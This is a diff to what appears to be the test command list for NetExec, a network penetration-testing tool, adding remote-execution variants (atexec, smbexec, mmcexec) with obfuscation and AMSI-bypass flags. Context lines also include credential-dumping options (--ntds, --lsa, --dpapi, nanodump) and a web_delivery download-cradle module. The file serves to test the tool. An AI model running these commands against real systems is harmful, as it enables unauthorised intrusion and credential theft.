@@ -1,3 +1,5 @@
+##### Check Generic Help Options
+netexec -h
 ##### SMB
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS # need an extra space after this command due to regex
 netexec {DNS} smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS
@@ -21,11 +23,17 @@ netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --ntds
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --lsa
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --dpapi
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -x ipconfig
+netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -x ipconfig --exec-method atexec
+netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -x ipconfig --exec-method smbexec
+netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -x ipconfig --exec-method mmcexec
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --put-file TEST_NORMAL_FILE C:\Windows\Temp\test_file.txt
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --put-file TEST_NORMAL_FILE C:\Windows\Temp\test_file.txt --put-file TEST_NORMAL_FILE C:\Windows\Temp\test_file2.txt
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --get-file C:\Windows\Temp\test_file.txt /tmp/test_file.txt 
 ##### SMB PowerShell
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig
+netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --exec-method atexec
+netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --exec-method smbexec
+netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --exec-method mmcexec
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --force-ps32
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --obfs
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --force-ps32 --obfs
@@ -39,9 +47,9 @@ netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --force-ps32 --obfs --no-encode
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --obfs --amsi-bypass AMSI_BYPASS_FILE --no-encode
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --force-ps32 --obfs --amsi-bypass AMSI_BYPASS_FILE --no-encode
-netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --exec-method atexec
-netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --exec-method smbexec
-netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --exec-method mmcexec
+netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --force-ps32 --obfs --amsi-bypass AMSI_BYPASS_FILE --no-encode --exec-method atexec
+netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --force-ps32 --obfs --amsi-bypass AMSI_BYPASS_FILE --no-encode --exec-method smbexec
+netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -X ipconfig --force-ps32 --obfs --amsi-bypass AMSI_BYPASS_FILE --no-encode --exec-method mmcexec
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --clear-obfscripts # current we don't really use?
 netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --wmi "select Name from win32_computersystem"
 netexec --jitter 2 smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS
@@ -204,8 +212,6 @@ netexec mssql TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M mssql_
 netexec mssql TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M nanodump
 netexec mssql TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M test_connection -o HOST=localhost
 netexec mssql TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M web_delivery -o URL=localhost/dl_cradle
-# a bit janky, but we try to enable RDP before testing RDP
-#netexec smb TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS -M rdp -o ACTION=enable
 ##### RDP
 netexec rdp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS # need an extra space after this command due to regex
 netexec {DNS} rdp TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS
